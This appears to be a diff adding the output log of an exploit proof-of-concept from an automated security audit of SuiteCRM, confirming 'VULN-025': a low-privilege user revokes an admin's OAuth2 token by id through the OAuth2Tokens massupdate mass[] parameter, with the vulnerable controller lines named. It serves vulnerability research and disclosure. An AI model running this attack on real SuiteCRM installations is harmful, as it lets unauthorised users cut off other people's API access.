@@ -1,0 +1,16 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-025/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-025/../.venv
+========================================================================
+VULN-025: OAuth2Tokens massupdate mass[] revokes ANY token by id (BOLA)
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/OAuth2Tokens/controller.php:63-72 mass[] branch — getBean by id, no ACL/owner check
+[SETUP] attacker = low-priv user mod_5812b9a9 (is_admin=0)
+[SETUP] created OAuth2 password-grant client 23977b7c-c268-4a95-bd8d-5c827b978ff8
+[SETUP] minted VICTIM token (assigned to admin); oauth2tokens row id=f3ed32c1-6629-4ebe-9041-cf5577e8180a
+[PROOF] victim token works BEFORE attack: GET /Api/V8/module/Accounts -> HTTP 200 (expect 200)
+[STEP] attacker POSTs massupdate mass[]=<victim token id> — by-id revoke, no ACL check
+[PROOF] attacker massupdate: HTTP 301, csrf-blocked=False
+[PROOF] victim token works AFTER attack: HTTP 401 (expect 401 = revoked)
+[OK] exploit confirmed — a low-priv user revoked ANOTHER principal's (admin's) OAuth token by id; the victim token went from working (200) to revoked (401)
+==> VULN-025: CONFIRMED — low-priv mass[]=<id> revokes any user's OAuth token (BOLA -> API DoS)
